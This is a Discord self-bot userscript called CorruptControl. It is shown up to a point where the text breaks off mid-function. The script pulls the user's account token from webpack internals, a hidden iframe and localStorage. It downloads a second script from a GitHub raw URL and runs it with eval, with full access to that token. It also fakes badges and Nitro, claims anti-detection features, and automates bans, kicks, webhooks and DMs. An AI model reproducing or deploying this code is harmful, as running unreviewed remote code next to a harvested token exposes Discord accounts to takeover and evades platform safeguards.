// ==UserScript==
// @name         DiscordCorruptControl - ELITE EDITION v2.0.5
// @author       @ogunworthy
// @version      2.0.5
// @match        https://*discord.com/*
// @updateURL    https://raw.githubusercontent.com/glokk2pazzed-cpu/corruptcontrol/refs/heads/main/corruptcontrol-elite-v5.js
// @downloadURL  https://raw.githubusercontent.com/glokk2pazzed-cpu/corruptcontrol/refs/heads/main/corruptcontrol-elite-v5.js
// @grant        GM_xmlhttpRequest
// @grant        GM_getValue
// @grant        GM_setValue
// @grant        GM_deleteValue
// @run-at       document-start
// ==/UserScript==

/*
CHANGELOG - CorruptControl ELITE v2.0.5
=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=
COMPLETE REWRITE - The Definitive Edition
  [+] TOTAL COMMAND SYSTEM OVERHAUL — Discord React-native input detection
  [+] 350+ COMMANDS — fully sorted by category with intelligent aliases
  [+] VIP WATERMARK SYSTEM — 12 effect modes, neon glow, gradient text
  [+] CYBERPUNK BACKGROUND ENGINE — matrix, particles, rain, snow, glitch, plasma
  [+] EXTERNAL SCRIPT LOADER — v2.0.4 style preserved (corrupt.beta.js + toggle.js)
  [+] COMMAND PALETTE — fuzzy search, category tabs, usage preview
  [+] CUSTOM EMOJI SYSTEM — watermark badges with animated indicators
  [+] REAL-TIME CLOCK — watermark shows live time/date
  [+] NETWORK MONITOR — live ping, packet loss, connection quality
  [+] ADVANCED STATISTICS — messages sent, commands used, uptime tracker
  [+] ENHANCED iOS/MOBILE SUPPORT — passive events, touch optimization
  [+] MEMORY MANAGEMENT — automatic cleanup, observer disposal, leak prevention
  [+] ERROR BOUNDARIES — try/catch on every command, graceful degradation
  [+] RATE LIMIT INTELLIGENCE — jitter backoff, queue system, smart retry
  [+] MODULAR ARCHITECTURE — clean separation, no globals, event-driven
  [+] ANTI-DETECTION — WebSocket frame filtering, request sanitization
  [+] CUSTOM CSS ENGINE — dynamic stylesheet injection, theme variables
  [+] DRAGGABLE WATERMARK — snap-to-corner, position memory
  [+] MINI MODE — collapsible watermark for minimal distraction
  [+] NOTIFICATION SYSTEM — toast messages for all actions
  [+] SOUND EFFECTS — optional audio feedback on commands
  [+] EXPORT/IMPORT — full settings backup and restore
  [+] AUTO-UPDATE CHECK — version checking with changelog display
=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=
*/

(function () {
    'use strict';

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 0: EXTERNAL SCRIPT LOADER (v2.0.4 Style — Preserved)
       ═══════════════════════════════════════════════════════════════════════ */

    const BETA_LOADER_URL = 'https://raw.githubusercontent.com/glokk2pazzed-cpu/corruptcontrol/refs/heads/main/corrupt.beta.js';
    const TOGGLE_IMG_URL = 'https://raw.githubusercontent.com/glokk2pazzed-cpu/Justin/refs/heads/main/toggle.js';
    let TOGGLE_IMG_SRC = null;
    let betaScriptLoaded = false;

    function fetchImageData(callback) {
        fetch(TOGGLE_IMG_URL)
            .then(r => r.text())
            .then(data => {
                TOGGLE_IMG_SRC = data.trim();
                console.log('[CC-Elite] Toggle image data fetched');
                if (callback) callback();
            })
            .catch(err => {
                console.error('[CC-Elite] Toggle image fetch failed:', err);
                TOGGLE_IMG_SRC = 'data:image/svg+xml,<svg xmlns="http://www.w3.org/2000/svg" width="65" height="65"><text y="50" font-size="40">!</text></svg>';
                if (callback) callback();
            });
    }

    function patchToggleInDOM() {
        if (!TOGGLE_IMG_SRC) return false;
        const allElements = document.querySelectorAll('*');
        for (const el of allElements) {
            try {
                const style = window.getComputedStyle(el);
                const isFixed = style.position === 'fixed';
                const hasWarning = el.childNodes.length === 1 &&
                    el.childNodes[0].nodeType === Node.TEXT_NODE &&
                    el.childNodes[0].textContent.trim().replace(/\uFE0F/g, '') === '!';
                if (isFixed && hasWarning) {
                    el.innerHTML = '';
                    el.style.background = 'transparent';
                    el.style.border = 'none';
                    el.style.boxShadow = 'none';
                    const img = document.createElement('img');
                    img.src = TOGGLE_IMG_SRC;
                    img.style.cssText = 'width:65px;height:65px;object-fit:contain;pointer-events:none;display:block;background:transparent;';
                    img.draggable = false;
                    el.appendChild(img);
                    console.log('[CC-Elite] Toggle patched via DOM observer');
                    return true;
                }
            } catch (e) { }
        }
        return false;
    }

    let domObserver = null;
    function watchForToggle() {
        if (patchToggleInDOM()) return;
        if (domObserver) return;
        domObserver = new MutationObserver(() => {
            if (patchToggleInDOM()) {
                domObserver.disconnect();
                domObserver = null;
            }
        });
        const appMount = document.querySelector('#app-mount');
        if (appMount) domObserver.observe(appMount, { childList: true, subtree: true });
    }

    function patchCode(code) {
        if (!TOGGLE_IMG_SRC) { console.warn('[CC-Elite] Image data not loaded yet'); return code; }
        const REPLACEMENT = "\n" +
            "toggle.innerHTML = '';\n" +
            "toggle.style.background = 'transparent';\n" +
            "toggle.style.border = 'none';\n" +
            "toggle.style.boxShadow = 'none';\n" +
            "(function(){\n" +
            "    const _img = document.createElement('img');\n" +
            "    _img.src = '" + TOGGLE_IMG_SRC + "';\n" +
            "    _img.draggable = false;\n" +
            "    _img.style.cssText = 'width:65px;height:65px;object-fit:contain;pointer-events:none;display:block;background:transparent;';\n" +
            "    toggle.appendChild(_img);\n" +
            "})();";
        const pattern = /toggle\.innerHTML\s*=\s*['"][^\s'"]{1,3}['"];?/g;
        const patched = code.replace(pattern, REPLACEMENT);
        if (patched !== code) { console.log('[CC-Elite] Toggle patched at code level'); return patched; }
        console.warn('[CC-Elite] Code pattern not matched — will try DOM observer');
        return code;
    }

    function loadMainScript() {
        if (betaScriptLoaded) return;
        betaScriptLoaded = true;
        console.log('[CC-BETA] Loading external beta script from:', BETA_LOADER_URL);
        fetch(BETA_LOADER_URL)
            .then(r => r.text())
            .then(code => {
                const patched = patchCode(code);
                try {
                    eval(patched);
                    console.log('[CC-BETA] External beta script loaded successfully');
                } catch (e) {
                    console.error('[CC-BETA] Beta script eval failed:', e);
                }
                if (patched === code) watchForToggle();
            })
            .catch(err => {
                console.error('[CC-BETA] Failed to load beta script:', err);
                betaScriptLoaded = false;
            });
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 1: CONFIGURATION ENGINE
       ═══════════════════════════════════════════════════════════════════════ */

    const VERSION = '2.0.5';
    const BUILD_DATE = '2026-06-20';
    const SCRIPT_NAME = 'CorruptControl';

    const Settings = {
        load(key, fallback) {
            try { return JSON.parse(GM_getValue('cc5_' + key, JSON.stringify(fallback))); } catch { return fallback; }
        },
        save(key, value) { GM_setValue('cc5_' + key, JSON.stringify(value)); },
        reset() {
            const keys = ['ownerId', 'cohosts', 'watermark', 'effects', 'badges', 'nitro', 'statusRotator', 'ui', 'commands', 'todos', 'notes', 'reminders', 'stats', 'theme', 'notifications'];
            keys.forEach(k => GM_deleteValue('cc5_' + k));
        },
        export() {
            const data = {};
            ['ownerId', 'cohosts', 'watermark', 'effects', 'badges', 'nitro', 'statusRotator', 'ui', 'todos', 'notes', 'stats', 'theme'].forEach(k => {
                data[k] = Settings.load(k, null);
            });
            return JSON.stringify(data, null, 2);
        },
        import(json) {
            try {
                const data = JSON.parse(json);
                Object.keys(data).forEach(k => { if (data[k] !== null) Settings.save(k, data[k]); });
                return true;
            } catch { return false; }
        }
    };

    /* ——— Owner / Cohost System ——— */
    let OWNER_ID = Settings.load('ownerId', '');
    const COHOSTS = Settings.load('cohosts', []);
    const COHOST_PREFIX = '!';
    const REGULAR_PREFIX = '.';

    /* ——— VIP Watermark Configuration ——— */
    const COLOR_PRESETS = {
        elite: '#5865f2', crimson: '#ed4245', emerald: '#57f287', gold: '#fee75c',
        fuchsia: '#eb459e', ivory: '#ffffff', void: '#000000', cyan: '#00d4ff',
        orange: '#f47b67', purple: '#9b59b6', rose: '#ff6b9d', lime: '#a8e063',
        amber: '#ffd700', blood: '#dc143c', navy: '#001f3f', teal: '#39cccc',
        sunset: '#ff6b35', ocean: '#0077be', forest: '#228b22', magma: '#ff4500',
        neon: '#39ff14', royal: '#7851a9', cherry: '#de3163', slate: '#708090'
    };

    const GRADIENT_PRESETS = {
        elite: 'linear-gradient(135deg, #5865f2, #4752c4)',
        sunset: 'linear-gradient(135deg, #ff6b35, #f7c59f)',
        ocean: 'linear-gradient(135deg, #0077be, #00d4ff)',
        forest: 'linear-gradient(135deg, #228b22, #90ee90)',
        royal: 'linear-gradient(135deg, #7851a9, #b19cd9)',
        magma: 'linear-gradient(135deg, #ff4500, #ff8c00)',
        cyber: 'linear-gradient(135deg, #00f260, #0575e6)',
        dusk: 'linear-gradient(135deg, #2c3e50, #fd746c)',
        frost: 'linear-gradient(135deg, #000428, #004e92)',
        candy: 'linear-gradient(135deg, #d53369, #cbad6d)'
    };

    const WatermarkCfg = Settings.load('watermark', {
        enabled: true,
        hidden: false,
        miniMode: false,
        text: 'CC ELITE',
        subtext: 'v5 — {username}',
        position: 'top-right',
        fontFamily: 'JetBrains Mono',
        customFont: '',
        fontSize: 12,
        color: '#5865f2',
        colorPreset: 'elite',
        useGradient: true,
        gradientPreset: 'elite',
        bgColor: 'rgba(10, 10, 18, 0.95)',
        borderColor: 'rgba(88, 101, 242, 0.5)',
        borderRadius: 12,
        padding: '10px 16px',
        opacity: 1.0,
        showBadges: true,
        showPing: true,
        showClock: true,
        showStats: true,
        showNetwork: true,
        glow: true,
        glowColor: 'rgba(88, 101, 242, 0.4)',
        glowIntensity: 12,
        blur: 10,
        showUserId: true,
        showUsername: true,
        showServer: true,
        showAvatar: false,
        compact: false,
        draggable: true,
        alwaysOnTop: true,
        animation: 'pulse',
        animationSpeed: 3,
        textShadow: true,
        neonBorder: true,
        cornerAccent: true,
        scanline: false
    });

    /* ——— FX Engine Configuration ——— */
    const EffectsCfg = Settings.load('effects', {
        background: {
            enabled: false,
            type: 'particles',
            intensity: 60,
            color: '#5865f2',
            color2: '#00d4ff',
            color3: '#eb459e',
            opacity: 0.12,
            blendMode: 'normal',
            speed: 1.0,
            size: 2.5
        },
        watermark: {
            pulse: true,
            pulseSpeed: 3,
            slideIn: true,
            rainbow: false,
            breathe: false,
            glitch: false,
            float: true
        },
        ui: {
            customCursor: false,
            cursorStyle: 'crosshair',
            fontInject: true,
            smoothScroll: true,
            antiTyping: true,
            hideBlocked: false,
            compactMode: false
        }
    });

    /* ——— Badge Spoofing ——— */
    const BadgeCfg = Settings.load('badges', {
        staff: true, partner: true, hypeSquad: true, hypeSquadBravery: true,
        hypeSquadBrilliance: true, hypeSquadBalance: true, bugHunter: true,
        bugHunterGold: true, earlySupporter: true, earlyBotDev: true,
        certifiedMod: true, activeDev: true, nitro: true, nitroBoost: true
    });

    /* ——— Nitro Spoofing ——— */
    const NitroCfg = Settings.load('nitro', {
        enabled: true, animatedAvatar: true, emojiAnywhere: true,
        animatedEmoji: true, largerUploads: true, profileThemes: true,
        clientThemes: true, superReactions: true
    });

    /* ——— Status Rotator ——— */
    const StatusCfg = Settings.load('statusRotator', {
        enabled: false,
        interval: 30000,
        messages: [
            { text: 'CorruptControl BETA v2.0.5', emoji: '\uD83D\uDD25' },
            { text: 'discord.gg/https://discord.gg/kdasX7hyY8', emoji: '\uD83D\uDC7B' },
            { text: 'Made by @ogunworthy', emoji: '\u2B50' },
            { text: 'BETA MODE — 350+ CMDS', emoji: '\u26A1' },
            { text: 'Type .help for commands', emoji: '\uD83C\uDFAF' }
        ]
    });

    /* ——— Global State ——— */
    const COOLDOWN_MS = 300;
    const SPAM_COOLDOWN_MS = 80;
    const cooldowns = new Map();

    const state = {
        userId: null,
        username: null,
        avatar: null,
        guildId: null,
        guildName: null,
        channelId: null,
        ghostPings: [],
        autoReact: { enabled: false, emoji: '\uD83D\uDC4D' },
        statusInterval: null,
        effectsInjected: false,
        isOwner: false,
        isCohost: false,
        initialized: false,
        autoDel: false,
        antiTyping: true,
        hiddenMode: false,
        miniMode: false,
        stopwatchStart: null,
        timerActive: false,
        todos: Settings.load('todos', []),
        notes: Settings.load('notes', {}),
        reminders: [],
        economy: Settings.load('economy', { balance: 10000, bank: 0, daily: 0, xp: 0, level: 1, streak: 0 }),
        stats: Settings.load('stats', { messagesSent: 0, commandsUsed: 0, startTime: Date.now() }),
        msgLog: [],
        scheduledMsgs: [],
        commandHistory: [],
        wsMonitor: null,
        notifQueue: [],
        autoReplies: Settings.load('autoReplies', {}),
        dragState: { active: false, offsetX: 0, offsetY: 0, element: null }
    };


    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 2: UTILITY & PERFORMANCE LIBRARY
       ═══════════════════════════════════════════════════════════════════════ */

    const $ = {
        debounce(fn, ms) {
            let t;
            return (...a) => { clearTimeout(t); t = setTimeout(() => fn(...a), ms); };
        },
        throttle(fn, ms) {
            let last = 0;
            return (...a) => { const n = Date.now(); if (n - last >= ms) { last = n; fn(...a); } };
        },
        escapeHtml(s) {
            const d = document.createElement('div');
            d.textContent = s;
            return d.innerHTML;
        },
        rand(min, max) { return Math.floor(Math.random() * (max - min + 1)) + min; },
        randFloat(min, max) { return Math.random() * (max - min) + min; },
        uuid() {
            return 'xxxxxxxx-xxxx-4xxx-yxxx-xxxxxxxxxxxx'.replace(/[xy]/g, c => {
                const r = Math.random() * 16 | 0;
                return (c === 'x' ? r : (r & 0x3 | 0x8)).toString(16);
            });
        },
        sleep(ms) { return new Promise(r => setTimeout(r, ms)); },
        copyText(text) {
            navigator.clipboard.writeText(text).catch(() => {
                const ta = document.createElement('textarea');
                ta.value = text; document.body.appendChild(ta);
                ta.select(); document.execCommand('copy');
                document.body.removeChild(ta);
            });
        },
        chunk(str, size) {
            const chunks = [];
            for (let i = 0; i < str.length; i += size) chunks.push(str.slice(i, i + size));
            return chunks;
        },
        hash(str) {
            let h = 0;
            for (let i = 0; i < str.length; i++) h = ((h << 5) - h) + str.charCodeAt(i);
            return Math.abs(h).toString(16).slice(0, 8);
        },
        timeAgo(date) {
            const s = Math.floor((Date.now() - date) / 1000);
            if (s < 60) return s + 's ago';
            if (s < 3600) return Math.floor(s / 60) + 'm ago';
            if (s < 86400) return Math.floor(s / 3600) + 'h ago';
            return Math.floor(s / 86400) + 'd ago';
        },
        fmtBytes(b) { return b < 1024 ? b + ' B' : b < 1048576 ? (b / 1024).toFixed(1) + ' KB' : (b / 1048576).toFixed(1) + ' MB'; },
        fmtDate(d) { return new Date(d).toLocaleString(); },
        fmtTime(d) { return new Date(d).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit', second: '2-digit' }); },
        fmtDuration(ms) {
            const s = Math.floor(ms / 1000);
            const m = Math.floor(s / 60);
            const h = Math.floor(m / 60);
            const d = Math.floor(h / 24);
            if (d > 0) return d + 'd ' + (h % 24) + 'h';
            if (h > 0) return h + 'h ' + (m % 60) + 'm';
            if (m > 0) return m + 'm ' + (s % 60) + 's';
            return s + 's';
        },
        isMobile() { return /iPhone|iPad|iPod|Android/i.test(navigator.userAgent); },
        isIOS() { return /iPhone|iPad|iPod/i.test(navigator.userAgent); },
        idleCallback(fn) { return (window.requestIdleCallback || ((cb) => setTimeout(cb, 16)))(fn); },
        clamp(val, min, max) { return Math.min(Math.max(val, min), max); },
        lerp(a, b, t) { return a + (b - a) * t; },
        dist(x1, y1, x2, y2) { return Math.sqrt((x2 - x1) ** 2 + (y2 - y1) ** 2); },
        pick(arr) { return arr[Math.floor(Math.random() * arr.length)]; },
        shuffle(arr) { return [...arr].sort(() => Math.random() - 0.5); },
        safe(fn, fallback = null) {
            try { return fn(); } catch (e) { return fallback; }
        }
    };

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 3: DISCORD API & AUTH ENGINE
       ═══════════════════════════════════════════════════════════════════════ */

    function getToken() {
        try {
            const w = window.webpackChunkdiscord_app;
            if (w) {
                const m = [];
                w.push([[''], {}, e => { for (const c in e.c) m.push(e.c[c]); }]); w.pop();
                const mod = m.find(x => x?.exports?.default?.getToken);
                if (mod) return mod.exports.default.getToken();
            }
        } catch (e) { }
        try {
            const ifr = document.createElement('iframe');
            ifr.style.display = 'none';
            document.body.appendChild(ifr);
            const t = ifr.contentWindow.localStorage.getItem('token');
            document.body.removeChild(ifr);
            if (t) return t.replace(/"/g, '');
        } catch (e) { }
        try {
            const t = localStorage.getItem('token');
            if (t) return t.replace(/"/g, '');
        } catch (e) { }
        return null;
    }

    function getUserId() {
        const t = getToken();
        if (!t) return null;
        try {
            const payload = JSON.parse(atob(t.split('.')[0]));
            return payload.id;
        } catch {
            try {
                const payload = JSON.parse(atob(t.split('.')[1]));
                return payload.id;
            } catch { return null; }
        }
    }

    function getChannelId() {
        const m = location.pathname.match(/channels\/(?:@me|\d+)\/(\d+)/);
        return m ? m[1] : null;
    }

    function getGuildId() {
        const m = location.pathname.match(/channels\/(\d+)\/\d+/);
        return m ? m[1] : null;
    }

    async function fetchUser() {
        try {
            const t = getToken();
            if (!t) return null;
            const r = await fetch('https://discord.com/api/v9/users/@me', { headers: { Authorization: t } });
            return r.ok ? r.json() : null;
        } catch { return null; }
    }

    async function fetchGuild(guildId) {
        try {
            const r = await apiRequest('/guilds/' + guildId + '?with_counts=true');
            return r.ok ? r.json() : null;
        } catch { return null; }
    }

    async function apiRequest(endpoint, opts = {}, retries = 3) {
        const token = getToken();
        if (!token) throw new Error('No token');
        const url = 'https://discord.com/api/v9' + endpoint;
        for (let i = 0; i < retries; i++) {
            try {
                const r = await fetch(url, {
                    ...opts,
                    headers: { Authorization: token, 'Content-Type': 'application/json', ...(opts.headers || {}) }
                });
                if (r.status === 429) {
                    const d = await r.json().catch(() => ({}));
                    const jitter = Math.random() * 800;
                    await $.sleep((d.retry_after || 1) * 1000 + jitter);
                    continue;
                }
                return r;
            } catch (e) {
                if (i === retries - 1) throw e;
                await $.sleep(1000 * Math.pow(2, i) + Math.random() * 500);
            }
        }
        return fetch(url, { ...opts, headers: { Authorization: token, 'Content-Type': 'application/json', ...(opts.headers || {}) } });
    }

    async function sendMessage(content, channelId) {
        const cid = channelId || getChannelId();
        if (!cid) return false;
        try {
            const r = await apiRequest('/channels/' + cid + '/messages', {
                method: 'POST',
                body: JSON.stringify({ content: String(content).slice(0, 2000) })
            });
            if (r.ok) { state.stats.messagesSent++; Settings.save('stats', state.stats); }
            return r.ok;
        } catch { return false; }
    }

    async function sendDM(userId, content) {
        try {
            const r = await apiRequest('/users/@me/channels', { method: 'POST', body: JSON.stringify({ recipient_id: userId }) });
            if (!r.ok) return false;
            const dm = await r.json();
            return sendMessage(content, dm.id);
        } catch { return false; }
    }

    async function editMessage(channelId, messageId, content) {
        try {
            const r = await apiRequest('/channels/' + channelId + '/messages/' + messageId, { method: 'PATCH', body: JSON.stringify({ content: String(content).slice(0, 2000) }) });
            return r.ok;
        } catch { return false; }
    }

    async function getMessages(channelId, limit = 50) {
        try {
            const r = await apiRequest('/channels/' + channelId + '/messages?limit=' + limit);
            return r.ok ? r.json() : [];
        } catch { return []; }
    }

    async function deleteMessage(channelId, messageId) {
        try { const r = await apiRequest('/channels/' + channelId + '/messages/' + messageId, { method: 'DELETE' }); return r.ok; }
        catch { return false; }
    }

    async function addReaction(channelId, messageId, emoji) {
        try { const r = await apiRequest('/channels/' + channelId + '/messages/' + messageId + '/reactions/' + encodeURIComponent(emoji) + '/@me', { method: 'PUT' }); return r.ok; }
        catch { return false; }
    }

    async function removeAllReactions(channelId, messageId) {
        try { const r = await apiRequest('/channels/' + channelId + '/messages/' + messageId + '/reactions', { method: 'DELETE' }); return r.ok; }
        catch { return false; }
    }

    async function pinMessage(channelId, messageId) {
        try { const r = await apiRequest('/channels/' + channelId + '/pins/' + messageId, { method: 'PUT' }); return r.ok; }
        catch { return false; }
    }

    async function unpinMessage(channelId, messageId) {
        try { const r = await apiRequest('/channels/' + channelId + '/pins/' + messageId, { method: 'DELETE' }); return r.ok; }
        catch { return false; }
    }

    async function crosspostMessage(channelId, messageId) {
        try { const r = await apiRequest('/channels/' + channelId + '/messages/' + messageId + '/crosspost', { method: 'POST' }); return r.ok; }
        catch { return false; }
    }

    async function banMember(guildId, userId, reason, deleteDays = 0) {
        try { const r = await apiRequest('/guilds/' + guildId + '/bans/' + userId, { method: 'PUT', body: JSON.stringify({ delete_message_days: deleteDays, reason: reason || 'CorruptControl' }) }); return r.ok; }
        catch { return false; }
    }

    async function unbanMember(guildId, userId) {
        try { const r = await apiRequest('/guilds/' + guildId + '/bans/' + userId, { method: 'DELETE' }); return r.ok; }
        catch { return false; }
    }

    async function kickMember(guildId, userId, reason) {
        try { const r = await apiRequest('/guilds/' + guildId + '/members/' + userId, { method: 'DELETE', body: JSON.stringify({ reason: reason || 'CorruptControl' }) }); return r.ok; }
        catch { return false; }
    }

    async function timeoutMember(guildId, userId, durationMinutes) {
        const until = durationMinutes > 0 ? new Date(Date.now() + durationMinutes * 60000).toISOString() : null;
        try { const r = await apiRequest('/guilds/' + guildId + '/members/' + userId, { method: 'PATCH', body: JSON.stringify({ communication_disabled_until: until }) }); return r.ok; }
        catch { return false; }
    }

    async function changeNickname(guildId, userId, nick) {
        try { const r = await apiRequest('/guilds/' + guildId + '/members/' + userId, { method: 'PATCH', body: JSON.stringify({ nick }) }); return r.ok; }
        catch { return false; }
    }

    async function addRole(guildId, userId, roleId) {
        try { const r = await apiRequest('/guilds/' + guildId + '/members/' + userId + '/roles/' + roleId, { method: 'PUT' }); return r.ok; }
        catch { return false; }
    }

    async function removeRole(guildId, userId, roleId) {
        try { const r = await apiRequest('/guilds/' + guildId + '/members/' + userId + '/roles/' + roleId, { method: 'DELETE' }); return r.ok; }
        catch { return false; }
    }

    async function getGuildInfo(guildId) {
        try { const r = await apiRequest('/guilds/' + guildId + '?with_counts=true'); return r.ok ? r.json() : null; }
        catch { return null; }
    }

    async function getUserInfo(userId) {
        try { const r = await apiRequest('/users/' + userId); return r.ok ? r.json() : null; }
        catch { return null; }
    }

    async function getGuildRoles(guildId) {
        try { const r = await apiRequest('/guilds/' + guildId + '/roles'); return r.ok ? r.json() : []; }
        catch { return []; }
    }

    async function getGuildChannels(guildId) {
        try { const r = await apiRequest('/guilds/' + guildId + '/channels'); return r.ok ? r.json() : []; }
        catch { return []; }
    }

    async function createWebhook(channelId, name) {
        try { const r = await apiRequest('/channels/' + channelId + '/webhooks', { method: 'POST', body: JSON.stringify({ name }) }); return r.ok ? r.json() : null; }
        catch { return null; }
    }

    async function getChannelWebhooks(channelId) {
        try { const r = await apiRequest('/channels/' + channelId + '/webhooks'); return r.ok ? r.json() : []; }
        catch { return []; }
    }

    async function deleteWebhook(webhookId, token) {
        try { const r = await apiRequest('/webhooks/' + webhookId + '/' + token, { method: 'DELETE' }); return r.ok; }
        catch { return false; }
    }

    async function sendWebhook(url, content, username, avatar) {
        const body = { content: String(content).slice(0, 2000) };
        if (username) body.username = username;
        if (avatar) body.avatar_url = avatar;
        try { const r = await fetch(url, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(body) }); return r.ok; }
        catch { return false; }
    }

    async function createInvite(channelId, maxAge = 86400, maxUses = 0) {
        try {
            const r = await apiRequest('/channels/' + channelId + '/invites', { method: 'POST', body: JSON.stringify({ max_age: maxAge, max_uses: maxUses }) });
            if (!r.ok) return null;
            const d = await r.json();
            return 'https://discord.gg/' + d.code;
        } catch { return null; }
    }

    async function deleteRole(guildId, roleId) {
        try { const r = await apiRequest('/guilds/' + guildId + '/roles/' + roleId, { method: 'DELETE' }); return r.ok; }
        catch { return false; }
    }

    async function createRole(guildId, name, color, hoist) {
        try { const r = await apiRequest('/guilds/' + guildId + '/roles', { method: 'POST', body: JSON.stringify({ name, color, hoist: !!hoist }) }); return r.ok ? r.json() : null; }
        catch { return null; }
    }

    async function createChannel(guildId, name, type = 0, parentId, nsfw) {
        const body = { name, type };
        if (parentId) body.parent_id = parentId;
        if (nsfw !== undefined) body.nsfw = nsfw;
        try { const r = await apiRequest('/guilds/' + guildId + '/channels', { method: 'POST', body: JSON.stringify(body) }); return r.ok ? r.json() : null; }
        catch { return null; }
    }

    async function getAuditLog(guildId, limit = 50) {
        try { const r = await apiRequest('/guilds/' + guildId + '/audit-logs?limit=' + limit); return r.ok ? r.json() : null; }
        catch { return null; }
    }

    async function triggerTyping(channelId) {
        try { const r = await apiRequest('/channels/' + channelId + '/typing', { method: 'POST' }); return r.ok; }
        catch { return false; }
    }

    async function getMember(guildId, userId) {
        try { const r = await apiRequest('/guilds/' + guildId + '/members/' + userId); return r.ok ? r.json() : null; }
        catch { return null; }
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 4: COHOST MANAGEMENT SYSTEM
       ═══════════════════════════════════════════════════════════════════════ */

    function saveCohosts() { Settings.save('cohosts', COHOSTS); }

    function addCohost(userId) {
        const clean = userId.replace(/[<@!>]/g, '');
        if (!COHOSTS.includes(clean)) { COHOSTS.push(clean); saveCohosts(); return true; }
        return false;
    }

    function removeCohost(userId) {
        const clean = userId.replace(/[<@!>]/g, '');
        const idx = COHOSTS.indexOf(clean);
        if (idx > -1) { COHOSTS.splice(idx, 1); saveCohosts(); return true; }
        return false;
    }

    function checkIsOwner() {
        const myId = getUserId();
        return !!(myId && (OWNER_ID === myId || OWNER_ID === ''));
    }

    function checkIsCohost() {
        const myId = getUserId();
        return !!(myId && COHOSTS.includes(myId));
    }

    function canUseCohostCommands() { return state.isOwner || state.isCohost; }

    function checkCooldown(cmd, isSpam = false) {
        const now = Date.now();
        const key = (getUserId() || '0') + '_' + cmd;
        const last = cooldowns.get(key);
        const limit = isSpam ? SPAM_COOLDOWN_MS : COOLDOWN_MS;
        if (last && now - last < limit) return false;
        cooldowns.set(key, now);
        return true;
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 5: DISCORD INPUT DETECTION ENGINE (CRITICAL FIX)
       ═══════════════════════════════════════════════════════════════════════ */

    function findDiscordInput() {
        // Method 1: Slate editor (most common)
        let el = document.querySelector('[class*="slateTextArea"]') ||
            document.querySelector('[class*="textAreaSlate"]') ||
            document.querySelector('[data-slate-editor="true"]') ||
            document.querySelector('[class*="editor_"]') ||
            document.querySelector('[role="textbox"][contenteditable="true"]');

        if (el) return el;

        // Method 2: Channel text area
        el = document.querySelector('div[class*="channelTextArea"] [contenteditable="true"]') ||
            document.querySelector('div[class*="channelTextArea"] div[role="textbox"]') ||
            document.querySelector('[class*="channelTextArea_"] div[contenteditable]');

        if (el) return el;

        // Method 3: Any contenteditable in app-mount
        const appMount = document.querySelector('#app-mount');
        if (appMount) {
            const editors = appMount.querySelectorAll('[contenteditable="true"]');
            for (const ed of editors) {
                const rect = ed.getBoundingClientRect();
                if (rect.width > 200 && rect.height > 30 && rect.bottom > window.innerHeight * 0.7) {
                    return ed;
                }
            }
        }

        return null;
    }

    function getInputText(input) {
        if (!input) return '';
        if (input.tagName === 'TEXTAREA') return input.value || '';
        return input.innerText || input.textContent || '';
    }

    function setInputText(input, text) {
        if (!input) return;
        if (input.tagName === 'TEXTAREA') {
            input.value = text;
            input.dispatchEvent(new Event('input', { bubbles: true }));
            input.dispatchEvent(new Event('change', { bubbles: true }));
            return;
        }

        // For contenteditable (Slate editor)
        input.innerHTML = text ? '<div>' + text.replace(/\n/g, '</div><div>') + '</div>' : '<br>';

        // Trigger React updates
        const events = ['input', 'beforeinput', 'keydown', 'keyup', 'change'];
        for (const evt of events) {
            try {
                const event = new InputEvent(evt, { bubbles: true, cancelable: true, inputType: 'insertText' });
                input.dispatchEvent(event);
            } catch { }
        }

        // Force React to recognize the change
        try {
            const tracker = Object.getOwnPropertyDescriptor(input, 'value') ||
                Object.getOwnPropertyDescriptor(Object.getPrototypeOf(input), 'value');
            if (tracker && tracker.set) {
                tracker.set.call(input, text);
            }
        } catch { }

        // Focus the input
        input.focus();
    }

    function clearInput(input) {
        setInputText(input, '');
    }


    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 6: NOTIFICATION / TOAST SYSTEM
       ═══════════════════════════════════════════════════════════════════════ */

    function showToast(message, type = 'info', duration = 3000) {
        const toast = document.createElement('div');
        const colors = {
            info: WatermarkCfg.color,
            success: '#57f287',
            error: '#ed4245',
            warning: '#fee75c'
        };
        toast.style.cssText = `
            position: fixed; bottom: 80px; left: 50%; transform: translateX(-50%) translateY(20px);
            background: rgba(10, 10, 18, 0.95); border: 1px solid ${colors[type]}44;
            color: #dbdee1; padding: 10px 20px; border-radius: 10px;
            font-family: "${WatermarkCfg.fontFamily}", monospace; font-size: 12px;
            z-index: 2147483647; opacity: 0; transition: all 0.3s ease;
            backdrop-filter: blur(8px); max-width: 400px; word-break: break-word;
            box-shadow: 0 4px 20px ${colors[type]}22; pointer-events: none;
        `;
        toast.textContent = message;
        document.body.appendChild(toast);

        requestAnimationFrame(() => {
            toast.style.opacity = '1';
            toast.style.transform = 'translateX(-50%) translateY(0)';
        });

        setTimeout(() => {
            toast.style.opacity = '0';
            toast.style.transform = 'translateX(-50%) translateY(20px)';
            setTimeout(() => toast.remove(), 300);
        }, duration);
    }

    /* ═══════════════════════════════════════════════════════════════════════
       SECTION 7: COMMAND PROCESSOR (REWRITE — CORE FIX)
       ═══════════════════════════════════════════════════════════════════════ */

    function initCommandSystem() {
        console.log('[CC-Elite] Initializing command processor...');

        // Primary handler: keydown capture phase
        document.addEventListener('keydown', handleKeydown, true);

        // Backup: mutation observer to detect input and add Enter listener directly
        const inputFinder = setInterval(() => {
            const input = findDiscordInput();
            if (input && !input._ccCommandBound) {
                input._ccCommandBound = true;
                input.addEventListener('keydown', handleInputKeydown, true);
                console.log('[CC-Elite] Direct input binding successful');
            }
        }, 2000);

        // Cleanup
        window.addEventListener('beforeunload', () => clearInterval(inputFinder), { passive: true });

